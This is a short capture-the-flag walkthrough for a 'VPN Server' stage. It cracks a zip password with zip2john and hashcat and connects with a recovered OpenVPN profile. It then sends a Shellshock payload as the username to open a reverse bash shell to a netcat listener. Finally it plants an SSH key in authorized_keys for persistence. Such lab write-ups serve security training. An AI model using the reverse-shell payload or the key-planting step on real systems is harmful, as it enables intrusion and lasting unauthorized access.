# VPN Server

1. Resume From [🗂 Mail Server](../10-Mail-Server/)
2. Get OVPN from Mail Server: [🗂 258-s.msg](../10-Mail-Server/08-store0/5/msg/0/258-3.msg)
3. Decode Zip File from Base64: `https://www.freeformatter.com/base64-encoder.html`
4. Install `John The Ripper`

5. Generate Hash `zip2john 03-vpn.zip > hashes\05-zip_hashes.txt`
6. Edit File (remove file names from hashes): [🗂 Zip Hashes](./hashes/06-zip_hashes.txt)
7. Run Hashcat
```
hashcat -m 13600 -a 3 ./hashes/06-zip_hashes.txt "?l?l?l?l?l?l?l"

# to show Results
hashcat -m 13600 -a 3 ./hashes/06-zip_hashes.txt "?l?l?l?l?l?l?l" --show > hashes\07-hashcat.txt
```
8. Hashcat Results in [🗂 Hashcat](./hashes/07-hashcat.txt): `ehsanit`
9. Extract and Edit: `09-vpn\client.ovpn`
```
...
remote 172.16.4.120 1194
...
```
10. Start: `nc -l 0.0.0.0 9696`
11. Lets Connect: `openvpn 09-vpn\client.ovpn` (I use GUI in Video!)
12. Send Username, Password
```
() { :;};/bin/bash -i >& /dev/tcp/10.120.0.7/9696 0>&1 &
```
13. Read Flag: MAZAPA_e33e4c6c2f2f1df8be066279d18c8e26
14. Persist Your Connection:
```
echo <public-key> >> ~/.ssh/authorized_keys
```
15. Connect with SSH
```
ssh -i "<private-key>" vpn_user@vpn.petromaz.ir
```